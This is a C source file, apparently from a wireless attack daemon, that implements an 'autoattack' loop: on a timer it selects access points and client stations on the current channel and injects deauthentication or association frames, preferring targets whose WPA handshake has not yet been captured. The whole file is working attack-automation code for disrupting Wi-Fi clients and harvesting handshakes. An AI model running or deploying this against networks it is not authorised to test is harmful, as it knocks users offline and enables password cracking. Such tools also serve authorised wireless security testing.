/* SPDX-License-Identifier: GPL-3.0-or-later */
#include "autoattack.h"
#include "log.h"
#include "proto.h"

#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/timerfd.h>
#include <unistd.h>

struct autoattack {
	struct table  *table;
	struct inject *inject;
	struct ipc    *ipc;
	const struct iface *iface;
	int            timerfd;
	int            running;
};

struct autoattack *autoattack_create(struct table *t, struct inject *inj, struct ipc *ipc, const struct iface *iface)
{
	struct autoattack *aa = calloc(1, sizeof *aa);
	if (!aa) return NULL;

	aa->table  = t;
	aa->inject = inj;
	aa->ipc    = ipc;
	aa->iface  = iface;
	aa->timerfd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK | TFD_CLOEXEC);
	if (aa->timerfd < 0) {
		log_err("timerfd_create(autoattack): %s", strerror(errno));
		free(aa);
		return NULL;
	}
	return aa;
}

void autoattack_destroy(struct autoattack *aa)
{
	if (!aa) return;
	if (aa->timerfd >= 0) {
		if (aa->ipc) ipc_remove_fd(aa->ipc, aa->timerfd);
		close(aa->timerfd);
	}
	free(aa);
}

int autoattack_fd(const struct autoattack *aa) { return aa->timerfd; }

static int emit_inject_event(struct autoattack *aa, const char *tag, const uint8_t bssid[6], const uint8_t *sta)
{
	char  buf[512];
	size_t pos = 0;
	int    first = 1;
	ssize_t r;
	char   mac_ap[18], mac_sta[18];
	dot11_mac_str(bssid, mac_ap);

	if ((r = proto_event_begin(buf, sizeof buf, pos, tag)) < 0) return -1;
	pos = (size_t)r;
	if ((r = proto_field_str(buf, sizeof buf, pos, &first, "bssid", mac_ap)) < 0) return -1;
	pos = (size_t)r;
	if (sta) {
		dot11_mac_str(sta, mac_sta);
		if ((r = proto_field_str(buf, sizeof buf, pos, &first, "sta", mac_sta)) < 0) return -1;
		pos = (size_t)r;
	}
	if ((r = proto_event_end(buf, sizeof buf, pos)) < 0) return -1;
	pos = (size_t)r;
	return ipc_broadcast(aa->ipc, buf, pos);
}

void autoattack_on_timer(void *user)
{
	struct autoattack *aa = user;
	uint64_t expirations;
	ssize_t  n = read(aa->timerfd, &expirations, sizeof expirations);
	if (n < 0) return;
	if (!aa->running) return;

	struct ap_record aps[TABLE_MAX_APS];
	int num_aps = table_snapshot_aps(aa->table, aps, TABLE_MAX_APS);
	if (num_aps == 0) return;

	time_t now = time(NULL);
	int current_chan = aa->iface->channel;

	struct ap_record *valid_aps[TABLE_MAX_APS];
	int num_valid_aps = 0;
	int has_unpwned_ap = 0;

	for (int i = 0; i < num_aps; i++) {
		if (aps[i].channel != current_chan) continue;
		if (now - aps[i].last_attack_time < 30) continue;
		valid_aps[num_valid_aps++] = &aps[i];
		if (!aps[i].handshake_captured) has_unpwned_ap = 1;
	}

	/* 50% chance to Deauth a STA, 50% chance to Assoc an AP */
	int do_deauth = (rand() % 2 == 0);

	if (do_deauth) {
		struct sta_record stas[TABLE_MAX_STAS];
		int num_stas = table_snapshot_stas(aa->table, stas, TABLE_MAX_STAS);

		struct sta_record *valid_stas[TABLE_MAX_STAS];
		int num_valid_stas = 0;
		int has_unpwned_sta = 0;

		for (int i = 0; i < num_stas; i++) {
			if (!stas[i].have_ap) continue;
			if (stas[i].channel != current_chan) continue;
			if (now - stas[i].last_attack_time < 30) continue;

			const struct ap_record *ap = table_find_ap(aa->table, stas[i].ap_bssid);
			if (!ap) continue;

			valid_stas[num_valid_stas++] = &stas[i];
			if (!ap->handshake_captured) has_unpwned_sta = 1;
		}

		if (num_valid_stas > 0) {
			int target_idx = -1;
			int start_idx = rand() % num_valid_stas;
			for (int i = 0; i < num_valid_stas; i++) {
				int idx = (start_idx + i) % num_valid_stas;
				const struct ap_record *ap = table_find_ap(aa->table, valid_stas[idx]->ap_bssid);
				if (has_unpwned_sta && ap && ap->handshake_captured) continue;
				target_idx = idx;
				break;
			}

			if (target_idx >= 0) {
				struct sta_record *sta = valid_stas[target_idx];
				inject_deauth(aa->inject, sta->ap_bssid, sta->mac, 5, 7);
				table_mark_sta_attacked(aa->table, sta->mac);
				emit_inject_event(aa, "inject.deauth", sta->ap_bssid, sta->mac);
				return;
			}
		}
	}

	/* Fallback or if Assoc chosen */
	if (num_valid_aps > 0) {
		int target_idx = -1;
		int start_idx = rand() % num_valid_aps;
		for (int i = 0; i < num_valid_aps; i++) {
			int idx = (start_idx + i) % num_valid_aps;
			if (has_unpwned_ap && valid_aps[idx]->handshake_captured) continue;
			target_idx = idx;
			break;
		}

		if (target_idx >= 0) {
			struct ap_record *ap = valid_aps[target_idx];
			inject_assoc(aa->inject, ap->bssid, ap->ssid, ap->ssid_len);
			table_mark_ap_attacked(aa->table, ap->bssid);
			emit_inject_event(aa, "inject.assoc", ap->bssid, NULL);
		}
	}
}

int autoattack_start(struct autoattack *aa, int interval_ms)
{
	if (!aa || interval_ms <= 0) return -1;
	struct itimerspec its = {0};
	its.it_value.tv_sec     = interval_ms / 1000;
	its.it_value.tv_nsec    = (long)(interval_ms % 1000) * 1000000L;
	its.it_interval         = its.it_value;
	if (timerfd_settime(aa->timerfd, 0, &its, NULL) < 0) {
		log_err("timerfd_settime(autoattack): %s", strerror(errno));
		return -1;
	}
	aa->running = 1;
	log_info("autoattack: started, interval %d ms", interval_ms);
	return 0;
}

int autoattack_stop(struct autoattack *aa)
{
	if (!aa) return -1;
	if (!aa->running) return 0;
	struct itimerspec its = {0};
	if (timerfd_settime(aa->timerfd, 0, &its, NULL) < 0) {
		log_err("timerfd_settime(autoattack disarm): %s", strerror(errno));
		return -1;
	}
	aa->running = 0;
	log_info("autoattack: stopped");
	return 0;
}
